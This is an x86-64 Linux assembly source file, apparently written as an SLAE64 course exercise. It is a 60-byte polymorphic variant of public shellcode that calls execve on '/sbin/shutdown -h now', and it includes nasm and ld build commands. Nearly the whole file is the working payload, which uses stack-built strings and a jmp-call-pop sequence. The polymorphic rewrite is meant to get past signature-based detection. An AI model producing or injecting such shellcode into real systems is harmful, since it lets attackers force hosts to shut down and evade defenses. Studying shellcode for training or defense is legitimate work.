; Author : SLAE64-PA-6470 (kahlon81)
; Date : 2018/02/21
;
; Linux/x86-64 - shutdown -h now x86_64 Shellcode - 60 bytes
;
; nasm -f elf64 shellcode-877-polymorphic.nasm -o shellcode-877-polymorphic.o
; ld shellcode-877-polymorphic.o -o shellcode-877-polymorphic
;
; Original shellcode :
;
; http://shell-storm.org/shellcode/files/shellcode-877.php
;
; Title: shutdown -h now x86_64 Shellcode - 65 bytes
; Platform: linux/x86_64
; Date: 2014-06-27
; Author: Osanda Malith Jayathissa (@OsandaMalith)

section .text

global _start

_start:

  xor rax, rax
  xor rdx, rdx 

  push rax
  push byte 0x77
  push word 0x6f6e ; now
  mov rbx, rsp

  push rax
  push word 0x682d ;-h
  mov rcx, rsp

  push rax

  jmp call_shellcode 
shellcode:
  pop rdi

  push rdx
  push rbx
  push rcx
  push rdi
  mov rsi, rsp

  add rax, 59
  syscall
call_shellcode:
  call shellcode
  shutdown: db '/sbin/shutdown'